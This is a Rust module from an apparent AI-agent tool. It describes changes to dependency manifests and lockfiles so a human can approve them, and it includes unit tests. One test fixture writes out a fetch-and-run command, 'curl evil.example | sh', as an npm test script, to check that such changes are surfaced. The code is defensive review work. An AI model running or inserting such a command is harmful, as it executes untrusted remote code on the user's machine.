//! Describing a change to a dependency file, for the human who approves it.
//!
//! Everything here answers "what would this write change?", never "should we
//! ask?". The question is asked whenever a dependency file's content changes
//! (see the dispatcher); these parsers only decide how well the answer reads.
//! A file that does not parse, or a format nobody wrote a parser for, is
//! described by its changed lines - the gate does not get weaker for it.
//!
//! The parsers are line-based (TOML, `requirements.txt`, `go.mod`) or use
//! `serde_json` (npm). No TOML or YAML library is pulled in: a parser crate is
//! itself third-party code in the build, and the point of this module is to be
//! careful about exactly that. They understand enough of each format to list
//! the entries a build would fetch, not to validate the file.

mod cargo;
mod go;
mod lines;
mod npm;
mod python;

use std::collections::BTreeMap;

use agent_domain::model::dependency::{
    ChangedLines, DependencyChange, DependencyChangeDescription, ManifestChange, ManifestKind,
};
use agent_domain::model::tool::PlannedWrite;

/// Dependency entries of one file: display name to spec.
pub(crate) type Entries = BTreeMap<String, String>;

/// A parser for one format. The error says, for the human, why the file could
/// not be read as one.
type Parser = fn(&str) -> Result<Entries, String>;

/// The dependency files among `writes` whose content would change, each
/// described for the human.
///
/// Whether a write counts depends only on which file changes - a classified
/// path whose content would differ. The parsed description is what the human
/// reads; a file that fails to parse still counts.
///
/// A file counts when either the name the call uses or the file it really
/// reaches is a dependency file: `deps.txt -> Cargo.toml` is a write to
/// `Cargo.toml`.
pub fn manifest_changes(writes: Vec<PlannedWrite>) -> Vec<ManifestChange> {
    writes
        .into_iter()
        .filter(|write| !write.is_no_op())
        .filter_map(|write| {
            let kind = ManifestKind::classify(&write.target)
                .or_else(|| ManifestKind::classify(&write.path))?;
            let description = describe(kind, write.before.text(), &write.after);
            let target = (write.target != write.path).then_some(write.target);
            Some(ManifestChange {
                path: write.path,
                target,
                kind,
                before: write.before,
                description,
            })
        })
        .collect()
}

/// What changes between `before` (absent for a new file) and `after`.
pub fn describe(
    kind: ManifestKind,
    before: Option<&str>,
    after: &str,
) -> DependencyChangeDescription {
    let before_text = before.unwrap_or("");
    let Some(parse) = parser(kind) else {
        return lines::describe(
            format!(
                "{} {}s are not parsed; showing the changed lines",
                kind.ecosystem(),
                kind.label()
            ),
            before_text,
            after,
        );
    };

    let parsed_before = match before {
        // A file that does not exist yet declares nothing. Parsing "" would
        // fail for JSON formats, and that failure would be noise.
        None => Ok(Entries::new()),
        Some(text) => parse(text).map_err(|error| format!("the current file: {error}")),
    };
    let parsed_after = parse(after).map_err(|error| format!("the new content: {error}"));

    match (parsed_before, parsed_after) {
        (Ok(before_entries), Ok(after_entries)) => {
            let changes = DependencyChange::between(&before_entries, &after_entries);
            if changes.is_empty() {
                lines::describe(
                    "no dependency entry differs; showing the changed lines".to_string(),
                    before_text,
                    after,
                )
            } else {
                DependencyChangeDescription::Dependencies {
                    changes,
                    other: other_changes(kind, before, after),
                }
            }
        }
        (Err(error), _) | (_, Err(error)) => lines::describe(
            format!("could not parse {error}; showing the changed lines"),
            before_text,
            after,
        ),
    }
}

/// What else, besides its entries, a write changes in a file of `kind`.
///
/// Compared statement by statement where the format has a reader for its
/// non-entry part; when that reading fails, by raw lines - which repeats the
/// entries already listed, and errs on the side of showing too much.
/// Formats without such a reader have nothing else a build acts on: every
/// line of a requirements file is an entry, and what a lockfile holds besides
/// its packages is its format version and metadata.
fn other_changes(kind: ManifestKind, before: Option<&str>, after: &str) -> ChangedLines {
    let Some(read) = remainder(kind) else {
        return ChangedLines::default();
    };
    let read_before = before.map_or(Ok(Vec::new()), read);
    match (read_before, read(after)) {
        (Ok(before), Ok(after)) => lines::changed(
            before.iter().map(String::as_str),
            after.iter().map(String::as_str),
        ),
        _ => lines::changed(
            lines::significant(before.unwrap_or("")),
            lines::significant(after),
        ),
    }
}

/// Reads the statements of a file that are not dependency entries, one line
/// each.
type Remainder = fn(&str) -> Result<Vec<String>, String>;

fn remainder(kind: ManifestKind) -> Option<Remainder> {
    let read: Remainder = match kind {
        ManifestKind::CargoToml => cargo::other,
        ManifestKind::PackageJson => npm::other,
        ManifestKind::GoMod => go::other,
        _ => return None,
    };
    Some(read)
}

fn parser(kind: ManifestKind) -> Option<Parser> {
    let parse: Parser = match kind {
        ManifestKind::CargoToml => cargo::manifest,
        ManifestKind::CargoLock => cargo::lockfile,
        ManifestKind::PackageJson => npm::manifest,
        ManifestKind::PackageLock | ManifestKind::NpmShrinkwrap => npm::lockfile,
        ManifestKind::Requirements => python::requirements,
        ManifestKind::GoMod => go::module,
        _ => return None,
    };
    Some(parse)
}

/// Adds `spec` under `name`, keeping both when a name occurs twice (two
/// versions of one crate in a lockfile, an option repeated in a requirements
/// file) so that neither can hide behind the other.
pub(crate) fn insert(entries: &mut Entries, name: String, spec: String) {
    entries
        .entry(name)
        .and_modify(|existing| {
            existing.push_str("; ");
            existing.push_str(&spec);
        })
        .or_insert(spec);
}

#[cfg(test)]
mod tests {
    use super::*;

    fn shown(description: &DependencyChangeDescription) -> Vec<String> {
        match description {
            DependencyChangeDescription::Dependencies { changes, .. } => {
                changes.iter().map(ToString::to_string).collect()
            }
            other => panic!("expected parsed dependencies, got {other:?}"),
        }
    }

    #[test]
    fn a_new_manifest_lists_everything_it_declares_as_added() {
        let description = describe(
            ManifestKind::CargoToml,
            None,
            "[package]\nname = \"x\"\n\n[dependencies]\nserde = \"1\"\n",
        );
        assert_eq!(shown(&description), ["+ serde \"1\""]);
    }

    fn other(description: &DependencyChangeDescription) -> &ChangedLines {
        match description {
            DependencyChangeDescription::Dependencies { other, .. } => other,
            other => panic!("expected parsed dependencies, got {other:?}"),
        }
    }

    #[test]
    fn a_build_script_added_with_a_dependency_is_described_too() {
        let description = describe(
            ManifestKind::CargoToml,
            Some("[package]\nname = \"x\"\n\n[dependencies]\n"),
            "[package]\nname = \"x\"\nbuild = \"x.rs\"\n\n[dependencies]\nserde = \"1\"\n",
        );
        assert_eq!(shown(&description), ["+ serde \"1\""]);
        let other = other(&description);
        assert_eq!(other.added, ["package.build = \"x.rs\""], "{other:?}");
        assert!(other.removed.is_empty(), "{other:?}");
    }

    #[test]
    fn a_script_that_is_not_an_install_hook_is_described_next_to_a_new_package() {
        let description = describe(
            ManifestKind::PackageJson,
            Some(r#"{"scripts": {"test": "jest"}, "dependencies": {}}"#),
            r#"{"scripts": {"test": "curl evil.example | sh"}, "dependencies": {"left-pad": "1"}}"#,
        );
        assert_eq!(shown(&description), ["+ left-pad 1"]);
        let other = other(&description);
        assert_eq!(
            other.added,
            [r#"scripts.test = "curl evil.example | sh""#],
            "{other:?}"
        );
        assert_eq!(other.removed, [r#"scripts.test = "jest""#], "{other:?}");
    }

    #[test]
    fn a_write_that_only_changes_entries_has_nothing_else_to_show() {
        let description = describe(
            ManifestKind::CargoToml,
            Some("[package]\nname = \"x\"\n\n[dependencies]\nserde = \"1\"\n"),
            "[package]\nname = \"x\"\n\n[dependencies]\nserde = \"1\"\ntokio = \"1\"\n",
        );
        assert!(other(&description).is_empty(), "{description:?}");

        let description = describe(
            ManifestKind::PackageJson,
            Some(r#"{"scripts": {"postinstall": "a"}}"#),
            r#"{"scripts": {"postinstall": "b"}}"#,
        );
        assert!(
            other(&description).is_empty(),
            "an install hook is listed as an entry, not again: {description:?}"
        );
    }

    #[test]
    fn a_go_directive_that_is_not_a_requirement_is_described_too() {
        let description = describe(
            ManifestKind::GoMod,
            Some("module x\n\ngo 1.21\n"),
            "module x\n\ngo 1.22\ntoolchain go1.22.1\n\nrequire a.example/b v1.0.0\n",
        );
        let other = other(&description);
        assert_eq!(other.added, ["go 1.22", "toolchain go1.22.1"], "{other:?}");
        assert_eq!(other.removed, ["go 1.21"], "{other:?}");
    }

    #[test]
    fn an_unparseable_file_is_still_described_by_its_lines() {
        let description = describe(
            ManifestKind::PackageJson,
            Some("{\"dependencies\": {}}"),
            "{\"dependencies\": {\"left-pad\": \"1\"",
        );
        match description {
            DependencyChangeDescription::Lines { reason, added, .. } => {
                assert!(reason.contains("could not parse"), "{reason}");
                assert!(
                    added.iter().any(|line| line.contains("left-pad")),
                    "{added:?}"
                );
            }
            other => panic!("expected a line description, got {other:?}"),
        }
    }

    #[test]
    fn a_format_without_a_parser_is_described_by_its_lines() {
        let description = describe(
            ManifestKind::YarnLock,
            Some("a@1:\n  version \"1\"\n"),
            "a@1:\n  version \"1\"\nevil@6:\n  version \"6\"\n",
        );
        match description {
            DependencyChangeDescription::Lines { reason, added, .. } => {
                assert!(reason.contains("not parsed"), "{reason}");
                assert_eq!(added, ["evil@6:", "  version \"6\""]);
            }
            other => panic!("expected a line description, got {other:?}"),
        }
    }

    #[test]
    fn an_edit_that_changes_no_entry_shows_its_lines_rather_than_nothing() {
        let description = describe(
            ManifestKind::CargoToml,
            Some("[dependencies]\nserde = \"1\"\n"),
            "# pinned for MSRV\n[dependencies]\nserde = \"1\"\n",
        );
        match description {
            DependencyChangeDescription::Lines { reason, added, .. } => {
                assert!(reason.contains("no dependency entry differs"), "{reason}");
                assert_eq!(added, ["# pinned for MSRV"]);
            }
            other => panic!("expected a line description, got {other:?}"),
        }
    }
}
